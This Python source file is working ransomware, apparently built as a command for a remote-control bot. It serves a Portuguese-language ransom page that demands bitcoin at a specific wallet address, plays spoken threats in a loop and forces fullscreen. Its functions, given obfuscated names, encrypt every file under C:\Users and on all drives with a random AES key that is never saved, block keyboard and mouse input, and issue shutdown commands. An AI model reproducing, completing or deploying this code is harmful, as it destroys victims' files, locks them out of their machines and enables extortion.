import webbrowser
import ctypes
import threading
import time
import asyncio
from flask import Flask
from gevent.pywsgi import WSGIServer
import os
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import base64
import logging

app = Flask(__name__)

@app.route('/')
def ransomware_page():
    return """
    <!DOCTYPE html>
    <html lang="pt-BR">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>PAGUE AGORA</title>
        <style>
            body {
                background: url('https://media1.giphy.com/media/gdfmi2iHNnpAKKYrwa/200w.gif?cid=6c09b952yi88evhdo8jtkprnx576rty715szfblz0grv89gs&ep=v1_gifs_search&rid=200w.gif&ct=g') no-repeat center center fixed;
                background-size: cover;
                font-family: 'Arial', sans-serif;
                color: #f8f8f8;
                margin: 0;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                overflow: hidden;
            }
            .container {
                text-align: center;
                max-width: 700px;
                width: 100%;
                padding: 40px;
                background-color: rgba(0, 0, 0, 0.7);
                border-radius: 20px;
                box-shadow: 0 10px 30px rgba(0, 0, 0, 0.8);
            }
            h1 {
                font-size: 48px;
                color: rgb(0, 0, 0);
                font-weight: bold;
                margin: 0;
                text-shadow: 0 0 20px rgb(183, 0, 255), 0 0 30px rgba(255, 0, 0, 1);
            }
            p {
                font-size: 18px;
                color: #f8f8f8;
                margin-top: 30px;
            }
            .button {
                font-size: 20px;
                color: yellow;
                margin: 10px 0;
                padding: 15px;
                width: 80%;
                background-color: #333333;
                border: none;
                border-radius: 5px;
                cursor: pointer;
            }
            .button:hover {
                background-color: #444444;
            }
            .bottom-text {
                font-size: 18px;
                color: white;
                margin-top: 20px;
                font-weight: bold;
            }
            .notification {
                margin-top: 20px;
                color: lime;
                font-weight: bold;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>PAGUE OU PERCA TUDO</h1>
            <p>Olá, me chamo 0xy e acabei por alguma forma achando falha na sua rede!</p>
            <p>Siga as instruções para conseguir liberta-se envie-me BTC</p>
            <p>Se não seguir, irei desinstalar seu windows!!!</p>
            <button class="button" onclick="tutorial()">Aprenda Comprar BTC aqui</button>
            <button class="button" onclick="copyToClipboard()">bc1qhmwegsdp93y5z0x4w75r2wkfhg8qkekntgvedd</button>
            <p class="bottom-text">Certifique-se de depositar, não comprar diretamente com um cartão!</p>
            <p class="notification" id="notification"></p>
        </div>
        <script>
            function copyToClipboard() {
                const cryptoAddress = 'bc1qhmwegsdp93y5z0x4w75r2wkfhg8qkekntgvedd';
                navigator.clipboard.writeText(cryptoAddress).then(() => {
                    document.getElementById('notification').textContent = 'BTC Address Copied!';
                });
            }

            function tutorial() {
                window.open('https://www.youtube.com/watch?v=1pYEvb5Jee8', '_blank');
            }

            function speak(text) {
                const utterance = new SpeechSynthesisUtterance(text);
                utterance.rate = 1.5;
                utterance.pitch = 0.2;
                speechSynthesis.speak(utterance);
            }

            setInterval(() => {
                speak('Seu PC foi bloqueado com RANSOMWARE DE GRAU MILITAR. Todo o seu sistema operacional está sendo mantido como refém. Se você reiniciar seu PC, ele não será removido. Se você não nos pagar mais ou 100 dólares americanos em BITCOIN para o endereço mostrado na sua frente, destruiremos seu computador irreparavelmente. Depois que você pagar, removeremos gentilmente o software. Também estamos observando você em tempo real e temos controle total sobre seu sistema. Se você tentar matar o vírus, ele desinstalará o Windows. Todos os seus arquivos serão corrompidos com ele. BOA SORTE pagando, porque estamos fazendo login em todas as contas que você tem.');
            }, 1000);

            const titles = ["YOUR PC IS LOCKED!", "SYSTEM LOCKED", "PAGUE OU PERCA SEUS ARQUIVOS"];
            let titleIndex = 0;

            setInterval(() => {
                document.title = titles[titleIndex];
                titleIndex = (titleIndex + 1) % titles.length;
            }, 2000);

            document.body.addEventListener('click', (event) => {
                if (!event.target.closest('.button')) {
                    document.body.requestFullscreen().catch(() => {});
                }
            });

            window.onbeforeunload = function () {
                return "Tem certeza de que quer sair? Você tem ações não salvas!";
            };
        </script>
    </body>
    </html>
    """

def e333ncryp44334332file(file_path, key, log_file):
    try:
        with open(file_path, 'rb') as f:
            data = f.read()
        cipher = AES.new(key, AES.MODE_CBC)
        ct_bytes = cipher.encrypt(pad(data, AES.block_size))
        iv = base64.b64encode(cipher.iv).decode('utf-8')
        ct = base64.b64encode(ct_bytes).decode('utf-8')
        with open(file_path, 'w') as f:
            f.write(iv + ct)
        with open(log_file, 'a') as log:
            log.write(f"{file_path}\n")
    except PermissionError:
        logging.warning(f"Permission denied: {file_path}")
    except Exception as e:
        logging.error(f"Error encrypting {file_path}: {e}")

def d1r3ct03232ry3cnrypt(directory, key, log_file):
    for root, _, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            e333ncryp44334332file(file_path, key, log_file)

def e333ncryp443344d1322ves(key):
    log_file = os.path.join(os.getenv("TEMP"), "encrypted_files_log.txt")
    drives = [f"{chr(letter)}:\\" for letter in range(65, 91) if os.path.exists(f"{chr(letter)}:\\")]
    for drive in drives:
        d1r3ct03232ry3cnrypt(drive, key, log_file)

def o0x0x0xx0():
    http_server = WSGIServer(("0.0.0.0", 8080), app)
    http_server.serve_forever()

async def bts(ctx):
    try:
        key = os.urandom(16)  # Gera uma chave AES aleatória
        # Inicia o servidor HTTP em uma thread separada
        server_thread = threading.Thread(target=o0x0x0xx0)
        server_thread.daemon = True  # Define como daemon para que não bloqueie quando o programa sair
        server_thread.start()
        
        await ctx.reply("Servidor de ransomware iniciado.")
        
        # Abre o navegador em uma thread separada para não bloquear
        def open_browser():
            try:
                url = "http://localhost:8080"
                webbrowser.open(url)
            except Exception as e:
                print(f"Erro ao abrir navegador: {e}")
        
        browser_thread = threading.Thread(target=open_browser)
        browser_thread.daemon = True
        browser_thread.start()
        
        await ctx.reply("Página de ransomware aberta.")
        
        # Execute a criptografia em uma thread separada
        def encrypt_directory():
            try:
                log_file = os.path.join(os.getenv("TEMP"), "encrypted_files_log.txt")
                d1r3ct03232ry3cnrypt("C:\\Users", key, log_file)
                
                # Não bloqueia entradas do usuário imediatamente para permitir que o bot continue funcionando
                # Em vez disso, agenda para bloquear após um curto atraso
                def block_input_later():
                    try:
                        time.sleep(2)
                        ctypes.windll.user32.BlockInput(True)
                    except Exception as e:
                        print(f"Erro ao bloquear entrada: {e}")
                
                input_thread = threading.Thread(target=block_input_later)
                input_thread.daemon = True
                input_thread.start()
                
                # Envia mensagem de conclusão usando asyncio
                asyncio.run_coroutine_threadsafe(
                    ctx.reply("Ransomware completamente instalado. Entrada do usuário bloqueada."),
                    asyncio.get_event_loop()
                )
            except Exception as e:
                print(f"Erro na thread de criptografia: {e}")
                asyncio.run_coroutine_threadsafe(
                    ctx.reply(f"Erro ao executar ransomware: {e}"),
                    asyncio.get_event_loop()
                )
        
        # Inicia a criptografia em uma thread separada
        await ctx.reply("Iniciando criptografia do diretório...")
        encrypt_thread = threading.Thread(target=encrypt_directory)
        encrypt_thread.daemon = True
        encrypt_thread.start()
        
        return "Ransomware iniciado com sucesso"
    except Exception as e:
        await ctx.reply(f"Erro ao iniciar ransomware: {e}")
        return f"Erro: {e}"

def keysnotuse():
    try:
        # Adiciona um atraso pequeno para que o bot possa terminar de enviar mensagens
        time.sleep(0.5)
        ctypes.windll.user32.BlockInput(True)
    except Exception as e:
        print(f"Erro ao bloquear entrada: {e}")

def disable_shutdown():
    # Desativar o comando de desligamento
    os.system("shutdown -a")

    # Desativar o comando de reiniciar
    os.system("shutdown -r -t 0")